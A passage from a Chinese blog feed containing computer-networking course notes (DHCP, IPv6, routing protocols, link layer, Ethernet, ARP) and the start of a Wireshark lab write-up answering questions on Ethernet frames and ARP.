向客户做出响应， 该报文向该子网的所有节点广播 ， 仍然使用 IP 广播地址 255.255.255.255</p></li><li><p><strong>DHCP请求</strong></p><p>新到达的客户从一个或多个服务器提供中选择一个， 并向选中的服务器提供用 DHCP 请求报文 （ DHCP request message ) 进行响应， 回显配置的参数</p></li><li><p><strong>DHCP ACK</strong></p><p>服务器用 DHCP ACK 报文 ( DHCP ACK message) 对 DHCP 请求报文进行响应， 证实所要求的参数</p></li></ul><p><img src="/posts/9d1d146e/image-20220605121832903.png" alt="image-20220605121832903"></p><h3 id="444-网络地址转换nat"><a class="markdownIt-Anchor" href="#444-网络地址转换nat"></a> 4.4.4 网络地址转换NAT</h3><p>NAT技术（地址代理技术），提供内部私有地址与共有地址的转换，支持内网与公网的通信</p><p><img src="/posts/9d1d146e/image-20220605123503136.png" alt="image-20220605123503136"></p><h3 id="455-互联网控制报文协议icmp"><a class="markdownIt-Anchor" href="#455-互联网控制报文协议icmp"></a> 4.5.5 互联网控制报文协议ICMP</h3><p>IP网络是尽力而为（不可靠）的，ICMP通过<strong>差错报文</strong>和<strong>询问报文</strong>来辅助IP网络的功能</p><p>与IP关系：</p><p>ICMP报文作为IP层数据报的数据，加上IP首部组成IP数据报发送出去。</p><p><img src="/posts/9d1d146e/image-20220613140250306.png" alt="image-20220613140250306"></p><h3 id="446-ipv6"><a class="markdownIt-Anchor" href="#446-ipv6"></a> 4.4.6 IPv6</h3><p>特点：</p><ul><li>扩 大 的 地 址 容 量</li><li>简化高效的40字节首部</li><li>流标签</li></ul><p><img src="/posts/9d1d146e/image-20220605124448556.png" alt="image-20220605124448556"></p><ul><li>版 本。 该 4 比特字段用于标识 IP 版本号。 毫不奇怪， IPv6 将该字段值设为 6。</li><li>流量类型。 该 8 比特字段与我们在 IPv4 中看到的 T0S 字段的含义相似。</li><li>流 标 签。 如上面讨论过的那样， 该 20 比特的字段用于标识一条数据报的流， 能够对一条流中的某些数据报给岀优先权， 或者它能够用来对来自某些应用（ 例如 IP话音） 的数据报给出更高的优先权， 以优于来自其他应用（ 例如 SMTP 电子邮件）的数据报。</li><li>有效载荷长度。 该 16 比特值作为一个无符号整数， 给出了 IPv6 数据报中跟在定长的 40 字节数据报首部后面的字节数量。</li><li>下一个首部。 该字段标识数据报中的内容（ 数据字段） 需要交付给哪个协议（ 如TCP 或 UDP)。 该字段使用与 IPv4 首部中协议字段相同的值。</li><li>跳限制。 转发数据报的每台路由器将对该字段的内容减 1。 如果跳限制计数达到0, 则该数据报将被丢弃。</li><li>源地址和目的地址。 IPv6 128 比特地址的各种格式在 RFC 4291 中进行了描述。</li><li>数据。 这是 IPv6 数据报的有效载荷部分。 当数据报到达目的地时， 该有效载荷就从 IP 数据报中移出， 并交给在下一个首部字段中指定的协议处理。</li></ul><p><strong>从 IPv4 到 IPv6 的迁移</strong></p><p><img src="/posts/9d1d146e/image-20220605125253185.png" alt="image-20220605125253185"></p><h2 id="45-选路算法"><a class="markdownIt-Anchor" href="#45-选路算法"></a> 4.5 选路算法</h2><p><img src="/posts/9d1d146e/image-20220613141052311.png" alt="image-20220613141052311"></p><h3 id="451-链路状态路由选择算法"><a class="markdownIt-Anchor" href="#451-链路状态路由选择算法"></a> 4.5.1 链路状态路由选择算法</h3><p><img src="/posts/9d1d146e/image-20220613142004033.png" alt="image-20220613142004033"></p><p><img src="/posts/9d1d146e/image-20220613142215257.png" alt="image-20220613142215257"></p><h3 id="452-距离向量路由选择算法"><a class="markdownIt-Anchor" href="#452-距离向量路由选择算法"></a> 4.5.2 距离向量路由选择算法</h3><p>Bellman-Ford方程 (动态规划)</p><p><img src="/posts/9d1d146e/image-20220613142400246.png" alt="image-20220613142400246"></p><p><img src="/posts/9d1d146e/image-20220613142518942.png" alt="image-20220613142518942"></p><p>基本思想:</p><p><img src="/posts/9d1d146e/image-20220613142707187.png" alt="image-20220613142707187"></p><ul><li>每个节点周期性的发送它自己的距离矢量估计到其邻居</li><li>当节点x接收到来自邻居的新DV估计，它使用B-F方程更新其自己的DV</li><li>在规模较小、正常的条件下，估计值D<strong>x</strong>(y)收敛在实际最小费用 dx(y)</li></ul><p><img src="/posts/9d1d146e/image-20220613143549357.png" alt="image-20220613143549357"></p><h2 id="46-互联网中选路"><a class="markdownIt-Anchor" href="#46-互联网中选路"></a> 4.6 互联网中选路</h2><p>用于自治系统内部的路由协议称为“<strong>内部网关协议</strong>”，简称 <strong>IGP</strong>(Interior Gateway Protocol)</p><ul><li><p>RIP</p></li><li><p>OSPF</p></li><li><p>EIGRP</p></li></ul><p>用于自治系统间接口上的路由协议称为“<strong>外部网关协议</strong>”，简称<strong>EGP</strong>(Exterior Gateway Protocol)</p><ul><li>BGP-4</li></ul><h3 id="461-路由信息协议rip"><a class="markdownIt-Anchor" href="#461-路由信息协议rip"></a> 4.6.1 路由信息协议RIP</h3><p>路由信息协议 RIP 是内部网关协议 IGP中最先得到广泛使用的协议。</p><p>RIP 是一种分布式的基于距离向量的路由选择协议。</p><blockquote><p>应用层协议，使用UDP传送数据，RIP报文作为UDP的数据部分</p></blockquote><p>距离的定义：</p><ul><li><p>从一路由器到直接连接的网络的距离定义为 1。</p></li><li><p>从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加1。</p></li><li><p>RIP 协议中的“距离”也称为“跳数”(hop count)，因为每经过一个路由器，跳数就加 1。</p></li><li><p>RIP认为一个好的路由就是它通过的路由器的数目少，即“距离短”。</p></li><li><p>RIP允许一条路径最多只能包含 15 个路由器， “距离”的最大值为16 时即相当于不可达。</p></li></ul><p>RIP协议的三个要点 ：</p><ul><li><p>仅和相邻路由器交换信息。</p></li><li><p>交换的信息是当前本路由器所知道的全部信息，即自己的路由表。</p></li><li><p>按固定的时间间隔交换路由信息，例如，每隔 30 秒。</p></li></ul><p><img src="/posts/9d1d146e/image-20220613144427124.png" alt="image-20220613144427124"></p><p><img src="/posts/9d1d146e/image-20220613145858068.png" alt="image-20220613145858068"></p><p><strong>RIP协议的优缺点：</strong></p><ul><li><p>RIP 协议最大的优点就是实现简单，开销较小。</p></li><li><p>RIP 限制了网络的规模，它能使用的最大距离为 15（16 表示不可达）。</p></li><li><p>路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大，开销也就增加。</p></li><li><p>RIP 存在的一个问题是当网络出现故障时，要经过比较长的时间才能将此信息传送到所有的路由器。</p></li></ul><p>开放最短路径优先OSPF协议是目前IGP中应用最广、性能最有的协议。</p><h3 id="462-ospf协议"><a class="markdownIt-Anchor" href="#462-ospf协议"></a> 4.6.2 OSPF协议</h3><ul><li><p>使用链路状态算法</p></li><li><p>可适应大规模网络-层次OSPF</p></li><li><p>路由变化收敛速度快</p></li><li><p>其他特征</p><ul><li>支持路由等级划分，支持组播，支持验证，支持（多路径）等值路由</li></ul></li></ul><p>OSPF工作过程：</p><ul><li><p>每个路由器通过“HELLO”与邻居节点形成和维持邻居关系</p></li><li><p>路由器节点在与邻居的交互中掌握了本区域网络拓扑 ，使用 Dijkstra算法完成本节点的路由计算</p></li><li><p>邻居或链路状态发生变化时，将信息通过洪泛法散布到整个区域。</p></li><li><p>携带在OSPF报文中直接封装在IP中(而不是TCP或UDP)</p></li></ul><blockquote><p>网络层协议，直接使用IP数据报传送，数据封装在IP数据报的数据部分</p></blockquote><h3 id="463-bgp协议"><a class="markdownIt-Anchor" href="#463-bgp协议"></a> 4.6.3 BGP协议</h3><blockquote><p>应用层协议，使用TCP传送数据</p></blockquote><p>BGP (边界网关协议): AS间路由协议事实上的标准</p><p>BGP为每个AS提供了一种手段 :</p><ol><li><p>从相邻AS获得子网可达性信息</p></li><li><p>向AS内部的所有路由器传播可达性信息</p></li><li><p>基于可达性信息和策略，决定到子网的“好”路由</p></li></ol><h2 id="47-广播和多播选路"><a class="markdownIt-Anchor" href="#47-广播和多播选路"></a> 4.7 广播和多播选路</h2><p><img src="/posts/9d1d146e/image-20220613152330140.png" alt="image-20220613152330140"></p><h1 id="第5章-链路层和局域网"><a class="markdownIt-Anchor" href="#第5章-链路层和局域网"></a> 第5章 链路层和局域网</h1><h2 id="51-概述与服务"><a class="markdownIt-Anchor" href="#51-概述与服务"></a> 5.1 概述与服务</h2><ul><li><p>主机和路由器是<strong>节点</strong></p></li><li><p>连接沿通信路径的相邻节点的路径是<strong>链路</strong></p><ul><li><p>有线链路</p></li><li><p>无线链路</p></li><li><p>局域网</p></li></ul></li><li><p>第二层的分组叫<strong>帧</strong>,封装数据报</p></li></ul><p><strong>数据链路层具有经一条链路从一个节点传输数据到相邻节点的能力</strong></p><h4 id="链路层提供的服务"><a class="markdownIt-Anchor" href="#链路层提供的服务"></a> 链路层提供的服务</h4><ul><li><p><strong>成帧, 链路访问</strong>:</p><ul><li>将数据报封装进帧，加上首部和尾部</li><li>如果共享媒体，信道访问</li><li>位于帧首部的“MAC”地址标识源、目的地<ul><li>不同于IP地址!</li></ul></li></ul></li><li><p><strong>相连节点间的可靠交付</strong></p></li><li><p>在比特差错低的链路很少使用 (光纤，某些双绞线)</p></li><li><p>无线链路: 高差错率</p></li></ul><p><span style="background:#FFDBBB;">问题: 为什么同时使用链路级和端到端可靠性?</span></p><p><strong style="color:#ff0000;">数据链路层是为物理层提供可靠服务的，因为物理层可能导致比特传输差错，数据链路层保证点到点的可靠传输，即保证其向上层提供的数据是无差错的；</strong></p><p><strong style="color:#ff0000;">传输层是为网络层提供可靠传输服务的，因为数据报在核心网传输过程中，可能会在路由器那里因负载过高导致丢弃，然后传输层重传，来保证可靠传输，传输层保证端到端的可靠传输，这样传输层能保证向上层(也就是应用层)提供的数据是无误且按序交付的。</strong></p><ul><li><p><strong>流量控制</strong>:</p><ul><li>相邻发送和接收节点间的步调一致</li></ul></li><li><p><strong>差错检测</strong>:</p><ul><li>差错由信号衰减、噪声所致</li><li>接收方检测差错的存在</li><li>信号发送方负责重传或丢弃帧</li></ul></li><li><p><strong>纠错</strong>:</p><ul><li>接收方识别<em>和纠正</em>比特差错，而不采取重传</li></ul></li><li><p><strong>半双工and全双工</strong></p><ul><li>使用半双工, 链路的两端节点能够传输，但不能同时</li></ul></li></ul><h2 id="52-差错检测和纠错"><a class="markdownIt-Anchor" href="#52-差错检测和纠错"></a> 5.2 差错检测和纠错</h2><h3 id="521-奇偶校验"><a class="markdownIt-Anchor" href="#521-奇偶校验"></a> 5.2.1 奇偶校验</h3><p><img src="/posts/9d1d146e/image-20220613154455027.png" alt="image-20220613154455027"></p><h3 id="522-检验和方法"><a class="markdownIt-Anchor" href="#522-检验和方法"></a> 5.2.2 检验和方法</h3><p><img src="/posts/9d1d146e/image-20220613165706758.png" alt="image-20220613165706758"></p><h3 id="523-循环冗余检测"><a class="markdownIt-Anchor" href="#523-循环冗余检测"></a> 5.2.3 循环冗余检测</h3><p><img src="/posts/9d1d146e/image-20220613165931601.png" alt="image-20220613165931601"></p><h2 id="53-多路访问协议"><a class="markdownIt-Anchor" href="#53-多路访问协议"></a> 5.3 多路访问协议</h2><h3 id="631-信道划分协议"><a class="markdownIt-Anchor" href="#631-信道划分协议"></a> 6.3.1 信道划分协议</h3><h4 id="tdma-时分多路访问"><a class="markdownIt-Anchor" href="#tdma-时分多路访问"></a> TDMA: 时分多路访问</h4><ul><li><p>”循环“访问信道</p></li><li><p>每个站点在每个循环中获得固定长度时隙(长度=分组传输时间)</p></li><li><p>不使用的时隙空闲</p></li></ul><h4 id="fdma-频分多路访问"><a class="markdownIt-Anchor" href="#fdma-频分多路访问"></a> FDMA: 频分多路访问</h4><ul><li><p>信道频谱划分为频带</p></li><li><p>每个站点分配固定的频带</p></li><li><p>频带中未使用的传输时间空闲</p></li></ul><h3 id="632-随机访问协议"><a class="markdownIt-Anchor" href="#632-随机访问协议"></a> 6.3.2 随机访问协议</h3><p>当站点有分组要发送</p><ul><li><p>以信道全部速率R传输</p></li><li><p>节点间<em>无优先权</em>协调</p></li></ul><p>两个或更多传输节点➜ “碰撞”,</p><p>随即访问MAC协议 定义了:</p><ul><li><p>如何检测碰撞</p></li><li><p>如何从碰撞中恢复 (例如，经延迟的重新传输)</p></li></ul><p>随即访问MAC协议的例子:</p><ul><li><p>时隙ALOHA</p></li><li><p>ALOHA</p></li><li><p>CSMA, CSMA/CD, CSMA/CA</p></li></ul><h4 id="时隙aloha"><a class="markdownIt-Anchor" href="#时隙aloha"></a> 时隙ALOHA</h4><p><img src="/posts/9d1d146e/image-20220613170937523.png" alt="image-20220613170937523"></p><p>优点</p><ul><li><p>单个活跃节点能够连续地以信道的全速传输</p></li><li><p>高速分散：仅节点中的时隙需要同步</p></li><li><p>简单</p></li></ul><p>缺点</p><ul><li><p>碰撞，浪费时隙</p></li><li><p>空闲时隙</p></li><li><p>节点可能能够以小于传输分组的时间检测到碰撞</p></li><li><p>时钟同步</p></li></ul><p>效率为1/e=0.37</p><h4 id="aloha"><a class="markdownIt-Anchor" href="#aloha"></a> ALOHA</h4><p><img src="/posts/9d1d146e/image-20220613171509912.png" alt="image-20220613171509912"></p><h4 id="csma载波侦听多路访问"><a class="markdownIt-Anchor" href="#csma载波侦听多路访问"></a> CSMA(载波侦听多路访问)</h4><p><strong>CSMA</strong>: 在传输前侦听:</p><ul><li><p>如果侦听到信道空闲: 传输整个帧</p></li><li><p>如果侦听到信道忙, 推迟传输</p></li><li><p>检测到碰撞后，继续完整地传输它们的帧</p></li></ul><p><img src="/posts/9d1d146e/image-20220613172750269.png" alt="image-20220613172750269"></p><h4 id="csmacd"><a class="markdownIt-Anchor" href="#csmacd"></a> CSMA/CD</h4><p>CSMA/CD协议原理</p><ul><li><p>载波侦听：先听再说</p><ul><li>适配器在发送前监听总线是否空闲，总线空闲则发送数据，不空闲则继续监听</li></ul></li><li><p>冲突检测：边说边听</p><ul><li>数据在发送的同时保持对总线的监听，发现冲突则停止发送</li></ul></li><li><p>随机延迟后重发</p><ul><li>冲突发生后，采用指数回退方法等待一段随机时间后，再进行监听和发送</li></ul></li></ul><p>检测到碰撞将立即停止传输</p><p><img src="/posts/9d1d146e/image-20220613172805578.png" alt="image-20220613172805578"></p><h4 id="csmaca"><a class="markdownIt-Anchor" href="#csmaca"></a> CSMA/CA</h4><ul><li><p>CSMA/CD 用在以太网中</p></li><li><p>CSMA/CA 用在 802.11中</p></li></ul><h3 id="633-轮流协议"><a class="markdownIt-Anchor" href="#633-轮流协议"></a> 6.3.3 轮流协议</h3><p><strong>信道划分 MAC协议:</strong></p><ul><li><p>在高负载时高效、公平地共享信道</p></li><li><p>低负载时低效：信道访问中延时，当1个活跃节点时，甚至仅有分配了 1/N 带宽!</p></li></ul><p><strong>随机访问 MAC协议</strong></p><ul><li><p>低负载是有效：单个节点能够全面利用信道</p></li><li><p>高负载：碰撞开销</p></li></ul><p><strong>“轮流”协议</strong></p><ul><li>兼有这方面的优点!</li></ul><p><img src="/posts/9d1d146e/image-20220613173459293.png" alt="image-20220613173459293"></p><h2 id="54-链路层编址"><a class="markdownIt-Anchor" href="#54-链路层编址"></a> 5.4 链路层编址</h2><p>MAC地址</p><p>32-bit IP地址:</p><ul><li><p>网络层地址</p></li><li><p>用于使数据报到达目的IP子网</p></li></ul><p>MAC(或LAN 或物理或以太网)地址:</p><ul><li><p>用于使数据报从一个接口到达另一个物理连接的接口(同一个网络内)</p></li><li><p>48 bit MAC地址(对多数LAN) 烧在了适配器ROM中</p></li></ul><h3 id="arp-地址解析协议"><a class="markdownIt-Anchor" href="#arp-地址解析协议"></a> ARP: 地址解析协议</h3><p>工作在网络层</p><p>ARP 将一个 IP 地址解析为一个 MAC 地址</p><p><img src="/posts/9d1d146e/image-20220613183202684.png" alt="image-20220613183202684"></p><p>首先， 查询 ARP 报文是在广播帧中发送的， 而响应 ARP 报文在一个标准帧中发送。</p><p><img src="/posts/9d1d146e/image-20220613183659941.png" alt="image-20220613183659941"></p><p><img src="/posts/9d1d146e/image-20220613183736774.png" alt="image-20220613183736774"></p><h2 id="55-以太网"><a class="markdownIt-Anchor" href="#55-以太网"></a> 5.5 以太网</h2><p>以太网帧结构</p><p><img src="/posts/9d1d146e/image-20220613184124220.png" alt="image-20220613184124220"></p><p><strong>数 据 字 段 （ 46 ~ 1500 字节）</strong>。 这个字段承载了 IP 数据报。 以太网的最大传输单元( MTU ) 是 1500 字节。 这意味着如果 1P 数据报超过了 1500 字节， 则主机必须将该数据报分片， 如 4.3.2 节所讨论。 数据字段的最小长度是 46 字节。 这意味着如果 IP 数据报小于 46 字节， 数据报必须被填充到 46 字节。</p><p><strong>目的地址（6 字节）</strong>。 这个字段包含目的适配器的 MAC 地址， 即 BB- BB- BB- BB-BB-BB。</p><p><strong>源地址（6字节）</strong>。 这个字段包含了传输该帧到局域网上的适配器的 MAC 地址，在本例中为 AA- AA- AA- AA- AA- AA.<br>类 型 字 段（2 字节）。 类型字段允许以太网复用多种网络层协议。</p><p><strong>CRC (4 字节）</strong>。 如 6.2.3 节中讨论的那样， CRC ( 循环冗余检测） 字段的目的是使得接收适配器（ 适配器 B ) 检测帧中是否引入了差错。</p><p><strong>前同步码（8字节）</strong>。 以太网帧以一个 8 字节的前同步码 （ Preamble ) 字段开始。该前同步码的前 7 字节的值都是 10101010; 最后一个字节是 10101011。 前同步码字段的前7 字节用于 “ 唤醒” 接收适配器， 并且将它们的时钟和发送方的时钟同<br>步。</p><p>以太网使用CSMA/CD协议</p><p><img src="/posts/9d1d146e/image-20220613184653677.png" alt="image-20220613184653677"></p><p><img src="/posts/9d1d146e/image-20220613184706357.png" alt="image-20220613184706357"></p><h2 id="56-链路层交换机"><a class="markdownIt-Anchor" href="#56-链路层交换机"></a> 5.6 链路层交换机</h2><h3 id="集线器"><a class="markdownIt-Anchor" href="#集线器"></a> 集线器</h3><p><img src="/posts/9d1d146e/image-20220613185140619.png" alt="image-20220613185140619"></p><h3 id="交换机"><a class="markdownIt-Anchor" href="#交换机"></a> 交换机</h3><ul><li><p>工作在链路层</p></li><li><p>即插即用，自学习</p></li><li><p>线速转发</p></li></ul><h3 id="交换机-vs-路由器"><a class="markdownIt-Anchor" href="#交换机-vs-路由器"></a> 交换机 vs. 路由器</h3><ul><li><p>两者都是存储转发设备</p><ul><li><p>路由器: 网络层设备(检查网络层首部)</p></li><li><p>交换机是链路层设备</p></li></ul></li><li><p>路由器维护选路表，实现选路算法</p></li><li><p>交换机维护交换机表, 实现过滤、学习</p></li></ul><h2 id="57-ppp"><a class="markdownIt-Anchor" href="#57-ppp"></a> 5.7 PPP</h2><p><strong>概述</strong>：</p><ul><li><p>PPP（Point to Point Protocol）协议是在点对点链路上运行的数据链路层协议</p></li><li><p>用户使用拨号电话线接入Internet时，一般都是使用 PPP 协议</p></li><li><p>PPP协议支持用户的认证，是广域网接入使用最广泛的协议</p></li></ul><p><strong>PPP主要包括三个部分</strong>：</p><ul><li><p>在串行链路上封装上层数据报文的方法</p></li><li><p>采用LCP（Link-Control Protocol，链路控制协议）来建立、控制数据链路</p></li><li><p>采用NCP（Network-Control Protocol，网络控制协议）来支持多种网络协议</p></li></ul><p><img src="/posts/9d1d146e/image-20220613185805254.png" alt="image-20220613185805254"></p><h2 id="58-链路虚拟化"><a class="markdownIt-Anchor" href="#58-链路虚拟化"></a> <strong>5.8</strong> 链路虚拟化</h2><p><img src="/posts/9d1d146e/image-20220613190145329.png" alt="image-20220613190145329"></p><p>DNS：域名到IP的转换，应用层协议，基于UDP</p><p><strong style="color:#0070c0;">FTP：文件传输协议，端口21,20，应用层协议，基于TCP</strong></p><p><strong style="color:#0070c0;">SMTP、POP3：电子邮件系统，应用层协议，基于TCP</strong></p><p>RIP：路由信息协议，端口520，应用层协议，基于UDP</p><p><strong>OSPF：开放最短路径优先，网络层协议，直接使用IP数据报</strong></p><p><strong style="color:#0070c0;">BGP:边界网关协议，应用层协议，基于TCP</strong></p><p><strong>ARP：地址解析协议，IP地址到MAC地址的映射，工作在网络层</strong></p><p>DHCP：动态主机配置协议，应用层协议，基于UDP</p><p><strong>ICMP：网际控制报文协议，网络层协议</strong></p><blockquote><p><strong>为何要有 UDP协议?</strong>（优点）</p></blockquote><ul><li><p>无连接创建(它将增加时延)</p></li><li><p>简单：在发送方、接收方无连接状态</p></li><li><p>段首部小</p></li><li><p>无拥塞控制: UDP能够尽可能快地传输</p></li></ul><p>常用于流媒体应用程序</p><ul><li><p>丢包容忍</p></li><li><p>速率敏感</p></li></ul><p>其他UDP应用</p><ul><li><p>DNS</p></li><li><p>SNMP</p></li></ul><p>当应用程序<strong>对传输的可靠性要求不高</strong>，但是对<strong>传输速度和延迟要求较高</strong>时，可以用UDP协议来替代TCP协议在传输层控制数据的转发。</p><p>UDP适合于<strong>实时数据传输</strong>，如<strong>语音</strong>和<strong>视频通信</strong>，因为它们即使偶尔丢失一两个数据包，也不会对接收结果产生太大影响。例如：我们在看视频的时候偶尔丢一两个包也不影响体验。</p><p><span style="background:#FFDBBB;">问题: 为什么同时使用链路级和端到端可靠性?</span></p><p><strong style="color:#ff0000;">数据链路层是为物理层提供可靠服务的，因为物理层可能导致比特传输差错，数据链路层保证点到点的可靠传输，即保证其向上层提供的数据是无差错的；</strong></p><p><strong style="color:#ff0000;">传输层是为网络层提供可靠传输服务的，因为数据报在核心网传输过程中，可能会在路由器那里因负载过高导致丢弃，然后传输层重传，来保证可靠传输，传输层保证端到端的可靠传输，这样传输层能保证向上层(也就是应用层)提供的数据是无误且按序交付的。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络Lab4-WiresharkLab:Ethernet-and-ARP-v7.0</title>
    <link href="/posts/76311f61/"/>
    <url>/posts/76311f61/</url>
    
    <content type="html"><![CDATA[<h1 id="wireshark-lab-ethernet-and-arp-v70"><a class="markdownIt-Anchor" href="#wireshark-lab-ethernet-and-arp-v70"></a> Wireshark Lab: Ethernet and ARP   v7.0</h1><h2 id="1-capturing-and-analyzing-ethernet-frames"><a class="markdownIt-Anchor" href="#1-capturing-and-analyzing-ethernet-frames"></a> 1. Capturing and analyzing Ethernet frames</h2><h2 id="分析http-get的以太网帧"><a class="markdownIt-Anchor" href="#分析http-get的以太网帧"></a> 分析HTTP GET的以太网帧</h2><p>下面采用了本机自己抓包的数据</p><h3 id="1"><a class="markdownIt-Anchor" href="#1"></a> 1.</h3><blockquote><p>What is the 48-bit Ethernet address of your computer?<br>您的计算机的48位以太网地址是多少？</p></blockquote><p><img src="/posts/76311f61/image-20220512154013108.png" alt="image-20220512154013108"></p><p>如图所示，我的计算机48位以太网地址为d8:f2:ca:ce:19:ef</p><h3 id="2"><a class="markdownIt-Anchor" href="#2"></a> 2.</h3><blockquote><p>What is the 48-bit destination address in the Ethernet frame? Is this the Ethernet address of <a href="http://gaia.cs.umass.edu">gaia.cs.umass.edu</a>? (Hint: the answer is no). What device has this as its Ethernet address? [Note: this is an important question, and one that students sometimes get wrong. Re-read pages 468-469 in the text and make sure you understand the answer here.]<br>以太网帧中的48位目的地址是什么？这是gaia.cs.umass.edu的以太网地址吗？(提示：答案是否定的)。哪台设备的以太网地址为该地址？</p></blockquote><p><img src="/posts/76311f61/image-20220512154228837.png" alt="image-20220512154228837"></p><p>目的主机48位目的地址为b4:09:31:64:8d:02，这并不是gaia.cs.umass.edu的以太网地址，而是路由器的MAC地址。</p><p>我们发出的报文会先到达我们的路由器，经过层层转发最终才会到达目的地址。</p><h3 id="3"><a class="markdownIt-Anchor" href="#3"></a> 3.</h3><blockquote><p>Give the hexadecimal value for the two-byte Frame type field. What upper layer protocol does this correspond to?</p><p>为两字节帧类型字段指定十六进制值。这对应于哪个上层协议？</p></blockquote><p><img src="/posts/76311f61/image-20220512154858090.png" alt="image-20220512154858090"></p><p>如图，帧类型字段的十六进制值为 0x0800。这对应于 IP 协议，代表<strong>IP协议帧</strong></p><h3 id="4"><a class="markdownIt-Anchor" href="#4"></a> 4.</h3><blockquote><p>How many bytes from the very start of the Ethernet frame does the ASCII “G” in “GET” appear in the Ethernet frame?</p><p>从以太网帧的开头算起，GET中的ASCII“G”会出现在以太网帧中多少个字节？</p></blockquote><p><img src="/posts/76311f61/image-20220512160229345.png" alt="image-20220512160229345"></p><p>如图所示,前三行每行16个字节，第四行有6个字节，所以我们可以看到get中的G出现在第55个字节处</p><p>前54个字节分配依次是14个字节的以太网帧、20个字节的IP数据报头和20个字节的TCP报文头</p><h2 id="分析http-ok-响应的以太网帧"><a class="markdownIt-Anchor" href="#分析http-ok-响应的以太网帧"></a> 分析HTTP OK 响应的以太网帧</h2><h3 id="5"><a class="markdownIt-Anchor" href="#5"></a> 5.</h3><blockquote><p>What is the value of the Ethernet source address? Is this the address of your computer, or of <a href="http://gaia.cs.umass.edu">gaia.cs.umass.edu</a> (Hint: the answer is no). What device has this as its Ethernet address?<br>以太网源地址的值是多少？这是您计算机的地址，还是gaia.cs.umass.edu的地址(提示：答案是否定的)。哪台设备的以太网地址为该地址？</p></blockquote><p><img src="/posts/76311f61/image-20220512161041726.png" alt="image-20220512161041726"></p><p>目的地址为b4:09:31:64:8d:02</p><p>不是我的计算机的Mac地址也不是gaia.cs.umass.edu的地址</p><p>这是路由器的MAC地址</p><p>和上面的问题同理，经过层层转发，到达我的计算机时收到的报文的发送方实际是我当前网络的路由器。</p><h3 id="6"><a class="markdownIt-Anchor" href="#6"></a> 6.</h3><blockquote><p>What is the destination address in the Ethernet frame? Is this the Ethernet address of your computer?</p><p>以太网帧中的目的地址是什么？这是您计算机的以太网地址吗？</p></blockquote><p><img src="/posts/76311f61/image-20220512161141031.png" alt="image-20220512161141031"></p><p>目的地址为d8:f2:ca:ce:19:ef</p><p>是的，这是我电脑的MAC地址</p><h3 id="7"><a class="markdownIt-Anchor" href="#7"></a> 7.</h3><blockquote><p>Give the hexadecimal value for the two-byte Frame type field. What upper layer protocol does this correspond to?</p><p>为两字节帧类型字段指定十六进制值。这对应于哪个上层协议？</p></blockquote><p><img src="/posts/76311f61/image-20220512161638928.png" alt="image-20220512161638928"></p><p>如图，帧类型字段的十六进制值为 0x0800。这对应于 IP 协议，具体来说，帧类型字段对应于以太网帧的有效负载将到达的层</p><h3 id="8"><a class="markdownIt-Anchor" href="#8"></a> 8.</h3><blockquote><p>How many bytes from the very start of the Ethernet frame does the ASCII “O” in “OK” (i.e., the HTTP response code) appear in the Ethernet frame?</p><p>从以太网帧的起始处算起，以太网帧中会出现“OK”中的ASCII“O”(即HTTP响应码)多少个字节？</p></blockquote><p><img src="/posts/76311f61/image-20220512202603844.png" alt="image-20220512202603844"></p><p>从第一个帧开始算起，我们可以发现到出现OK前共有54个字节，这54个字节分配依次是14个字节的以太网帧、20个字节的IP数据报头和20个字节的TCP报文头</p><h2 id="2the-address-resolution-protocol"><a class="markdownIt-Anchor" href="#2the-address-resolution-protocol"></a> 2.The Address Resolution Protocol</h2><h3 id="9"><a class="markdownIt-Anchor" href="#9"></a> 9.</h3><blockquote><p>Write down the contents of your computer’s ARP cache. What is the meaning of each column value?</p><p>写下您计算机的ARP缓存的内容。每个列值的含义是什么？</p></blockquote><p><img src="/posts/76311f61/image-20220512162241820.png" alt="image-20220512162241820"></p><p>Internet Address列表示IP地址，Physical Address列表示MAC地址，type 表示协议类型分为动态和静态，动态类型会在一个老化时间后被刷新，静态条目则会一直存在（具体区别见<a href="#EX2">ex2</a>)</p><p>不同的interface表示不同的网络接口的ARP表</p><h3 id="10"><a class="markdownIt-Anchor" href="#10"></a> 10.</h3><blockquote><p>What are the hexadecimal values for the source and destination addresses in the Ethernet frame containing the ARP request message?</p><p>包含ARP请求消息的以太网帧中源地址和目的地址的十六进制值是多少？</p></blockquote><p>这部分使用了实验提供的抓包结果</p><p><img src="/posts/76311f61/image-20220512171645821.png" alt="image-20220512171645821"></p><p>其源mac地址为00:d0:59:a9:3d:68</p><p>目的地址为ff:ff:ff:ff:ff:ff，这是广播地址</p><h3 id="11"><a class="markdownIt-Anchor" href="#11"></a> 11.</h3><blockquote><p>Give the hexadecimal value for the two-byte Ethernet Frame type field. What upper layer protocol does this correspond to?</p><p>为双字节以太网帧类型字段指定十六进制值。这对应于哪个上层协议？</p></blockquote><p><img src="/posts/76311f61/image-20220512171733144.png" alt="image-20220512171733144"></p><p>以太网帧类型字段的十六进制值为 0x0806，这用于ARP协议</p><h3 id="12"><a class="markdownIt-Anchor" href="#12"></a> 12.</h3><blockquote><p>Download the ARP specification from <a href="ftp://ftp.rfc-editor.org/in-notes/std/std37.txt">ftp://ftp.rfc-editor.org/in-notes/std/std37.txt</a>. A readable, detailed discussion of ARP is also at <a href="http://www.erg.abdn.ac.uk/users/gorry/course/inet-pages/arp.html">http://www.erg.abdn.ac.uk/users/gorry/course/inet-pages/arp.html</a>.</p><ul><li>a) How many bytes from the very beginning of the Ethernet frame does the ARP opcode field begin?</li></ul><p>从ftp://ftp.rfc-editor.org/in-notes/std/std37.txt.下载地址解析协议规范。有关地址解析协议的可读性详细讨论也可在http://www.erg.abdn.ac.uk/users/gorry/course/inet-pages/arp.html.上找到。</p><ul><li>a)ARP操作码字段从以太网帧的开头开始多少个字节？</li></ul></blockquote><p><img src="/posts/76311f61/image-20220512171607838.png" alt="image-20220512171607838"></p><p>如图可以发现，</p><p>从以太网帧最开始到ARP 操作码字段开始中间共有20 个字节。</p><blockquote><ul><li>b) What is the value of the opcode field within the ARP-payload part of the Ethernet frame in which an ARP request is made?</li><li>b)发出ARP请求的以太网帧的ARP有效负载部分的操作码字段的值是多少？</li></ul></blockquote><p>同样从上图可以看出，请求的 ARP 有效负载的操作码字段的十六进制值为 0x0001.</p><blockquote><ul><li>c) Does 